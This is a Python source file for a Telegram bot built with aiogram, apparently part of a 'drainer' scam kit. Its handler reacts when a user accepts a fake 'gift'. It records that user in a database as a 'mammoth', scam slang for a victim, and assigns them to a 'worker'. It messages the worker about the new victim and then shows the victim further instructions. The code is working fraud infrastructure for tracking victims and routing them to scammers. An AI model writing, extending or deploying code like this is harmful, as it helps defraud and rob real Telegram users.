# twork/tdrainer/handlers/callback_handlers.py

from aiogram import Router, F, types
from aiogram.enums import ParseMode
from aiogram.filters.callback_data import CallbackData
from keyboards.user_keyboards import get_start_bot_keyboard
from handlers.user_handlers import get_instruction_text 

from database import link_mammoth_to_worker
from bot_instance import worker_bot
from utils import escape_md


router = Router()

class GiftCallback(CallbackData, prefix="gift"):
    action: str
    worker_id: int

@router.callback_query(GiftCallback.filter(F.action == "accept"))
async def accept_gift_handler(callback: types.CallbackQuery, callback_data: GiftCallback):
    worker_id = callback_data.worker_id
    mammoth_user = callback.from_user

    is_new_link = link_mammoth_to_worker(mammoth_id=mammoth_user.id, worker_id=worker_id)

    if is_new_link and worker_id != 0:
        try:
            mammoth_name = escape_md(mammoth_user.full_name)
            await worker_bot.send_message(
                worker_id,
                f"🎉 У вас новый мамонт: *{mammoth_name}*",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except Exception as e:
            print(f"Не удалось отправить уведомление воркеру {worker_id}: {e}")

    instruction_text = await get_instruction_text(callback.bot)

    if callback.inline_message_id:
        await callback.bot.edit_message_text(
            inline_message_id=callback.inline_message_id,
            text=instruction_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=get_start_bot_keyboard(worker_id)
        )
        await callback.answer("Now follow the instructions 👇")
    else:
        await callback.answer("Error: failed to edit message.", show_alert=True)